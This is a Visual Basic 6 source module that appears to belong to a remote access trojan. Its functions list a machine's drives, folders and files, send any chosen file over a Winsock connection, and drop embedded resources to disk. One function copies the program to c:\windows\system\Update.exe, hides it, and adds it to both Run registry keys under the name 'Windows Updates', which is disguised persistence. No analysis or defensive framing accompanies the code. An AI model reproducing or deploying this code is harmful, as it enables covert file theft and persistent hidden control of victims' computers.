Attribute VB_Name = "Module4"
Option Explicit
Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long

Global Const SW_SHOWNORMAL = 1

 Public Const DRIVE_CDROM = 5
Public Const DRIVE_FIXED = 3
Public Const DRIVE_RAMDISK = 6
Public Const DRIVE_REMOTE = 4
Public Const DRIVE_REMOVABLE = 2
Public Const vbAllFileSpec = "*.*"

Public Const MAX_PATH = 260

Public Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Dim hFind As Long

Public Type WIN32_FIND_DATA
  dwFileAttributes As Long
  ftCreationTime As FILETIME
  ftLastAccessTime As FILETIME
  ftLastWriteTime As FILETIME
  nFileSizeHigh As Long
  nFileSizeLow As Long
  dwReserved0 As Long
  dwReserved1 As Long
  cFileName As String * MAX_PATH
  cShortFileName As String * 14
End Type

Public wfd As WIN32_FIND_DATA
Public Const INVALID_HANDLE_VALUE = -1

Public lNodeCount As Long

Public Const vbBackslash = "\"
Public Const vbAscDot = 46


Public Function Enum_Drives() As String
Dim strDrive    As String
Dim strMessage  As String
Dim intCnt      As Integer
Dim rtn As String

strMessage = "|DRVS|"

For intCnt = 65 To 86
    strDrive = Chr(intCnt)
    Select Case GetDriveType(strDrive + ":\")
           Case DRIVE_REMOVABLE
                rtn = "Floppy Drive"
           Case DRIVE_FIXED
                rtn = "Hard Drive"
           Case DRIVE_REMOTE
                rtn = "Network Drive"
           Case DRIVE_CDROM
                rtn = "CD-ROM Drive"
           Case DRIVE_RAMDISK
                rtn = "RAM Disk"
           Case Else
                rtn = ""
    End Select
    
    If rtn <> "" Then
        strMessage = strMessage & strDrive & "," & GetDriveType(strDrive + ":\") & "|"
    End If
        
Next intCnt
Enum_Drives = Mid$(strMessage, 1, Len(strMessage) - 1)

End Function

Function ParseString(ByVal sString As String, ByVal Delimiter As String) As Collection
On Error GoTo ParseString_Error

Dim CurPos       As Long
Dim NextPos      As Long
Dim DelLen       As Integer
Dim nCount       As Integer
Dim TStr         As String
        
      Set ParseString = New Collection
        
      sString = Delimiter & sString & Delimiter
      DelLen = Len(Delimiter)
      nCount = 0
      CurPos = 1
      NextPos = InStr(CurPos + DelLen, sString, Delimiter)

      Do Until NextPos = 0
         ParseString.Add Mid$(sString, CurPos + DelLen, NextPos - CurPos - DelLen)
         nCount = nCount + 1
         
         CurPos = NextPos
         NextPos = InStr(CurPos + DelLen, sString, Delimiter)
      Loop


ParseString_Exit:
    Exit Function

ParseString_Error:
    Err.Raise Err.Number, "ParseString"
    Exit Function

   End Function

Public Function Get_File_Name(sString As String) As String

Dim lLoop As Long

For lLoop = Len(sString) To 1 Step -1

    If Mid$(sString, lLoop, 1) = "\" Then
        Get_File_Name = Mid$(sString, lLoop + 1, Len(sString))
    End If
    

Next lLoop



End Function

Public Function Enum_Files(sParentPath As String) As String

    
  Dim wfd As WIN32_FIND_DATA
  Dim hFind As Long
  Dim strString As String
  Dim sFileName As String
  
  strString = "|FILES|"
  
 sParentPath = NormalizePath(sParentPath)
 
    hFind = FindFirstFile(sParentPath & "\" & vbAllFileSpec, wfd)
  If (hFind <> INVALID_HANDLE_VALUE) Then
  
    Do
      
      sFileName = Left$(wfd.cFileName, InStr(wfd.cFileName, vbNullChar) - 1)
      
      If sFileName <> "." And sFileName <> ".." Then
        If wfd.dwFileAttributes <> vbDirectory Then
         strString = strString & sParentPath & Left$(wfd.cFileName, InStr(wfd.cFileName, vbNullChar) - 1) & "|" & FileLen(sParentPath & wfd.cFileName) & ","
        End If
      End If

    Loop While FindNextFile(hFind, wfd)
     
    Call FindClose(hFind)
  End If
    If strString <> "|FILES|" Then
         Enum_Files = Mid$(strString, 1, Len(strString) - 1)
    Else
         Enum_Files = strString
    End If
    
End Function

Public Function NormalizePath(sPath As String) As String
  If Right$(sPath, 1) <> "\" Then
    NormalizePath = sPath & "\"
  Else
    NormalizePath = sPath
  End If
End Function

Public Function Enum_Folders(sParentPath As String) As String

Dim strMessage  As String
Dim wfd As WIN32_FIND_DATA
Dim hFind As Long
  
strMessage = "|FOLDERS|"

 sParentPath = NormalizePath(sParentPath)
  
  hFind = FindFirstFile(sParentPath & vbAllFileSpec, wfd)
  If (hFind <> INVALID_HANDLE_VALUE) Then
  
    Do
      
      If (wfd.dwFileAttributes And vbDirectory) Then
        If (Asc(wfd.cFileName) <> vbAscDot) Then
          strMessage = strMessage & sParentPath & "," & Mid$(wfd.cFileName, 1, InStr(wfd.cFileName, vbNullChar) - 1) & "|"
        End If
      End If
    
    Loop While FindNextFile(hFind, wfd)
  
    Call FindClose(hFind)
  End If
  
  
  Screen.MousePointer = vbDefault
  Enum_Folders = Mid$(strMessage, 1, Len(strMessage) - 1)

End Function
Public Sub SendFile(Filename As String, WinS As Winsock)
On Error Resume Next
Dim FreeF As Integer
Dim LenFile As Long
Dim nCnt As Long
Dim LocData As String
Dim LoopTimes As Long
Dim i As Long
FreeF = FreeFile
Open Filename For Binary As #99
nCnt = 1
LenFile = LOF(99)
WinS.SendData "|FILESIZE|" & LenFile
DoEvents
Sleep (400)
Do Until nCnt >= (LenFile)
LocData = Space$(1024)
Get #99, nCnt, LocData
If nCnt + 1024 > LenFile Then
WinS.SendData Mid$(LocData, 1, (LenFile - nCnt))
Else
WinS.SendData LocData
End If
nCnt = nCnt + 1024
Loop
Close #99
End Sub
Public Function AddToSub()
On Error Resume Next
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
FileCopy App.Path & "\" & App.EXEName & ".exe", "c:\windows\system\Update.exe"
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Windows Updates", "c:\windows\system\Update.exe"
Reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Windows Updates", "c:\windows\system\Update.exe"
SetSystem "c:\windows\system\Update.exe"
End Function
Public Sub SetSystem(Filename As String)
On Error Resume Next
SetAttr Filename, vbHidden
End Sub

Public Sub ResToFile(Filename As String, ResID As Variant, ResType As Variant, Optional Overwrite As Boolean = False)
On Error GoTo trap
Dim Buffer() As Byte
Dim Filenum As Integer
If Dir(Filename) <> Empty Then
  If Overwrite Then Kill Filename Else Err.Raise 58
End If
Buffer = LoadResData(ResID, ResType)
Filenum = FreeFile
Open Filename For Binary Access Write As Filenum
Put Filenum, , Buffer
Close Filenum
trap:
    Exit Sub
End Sub
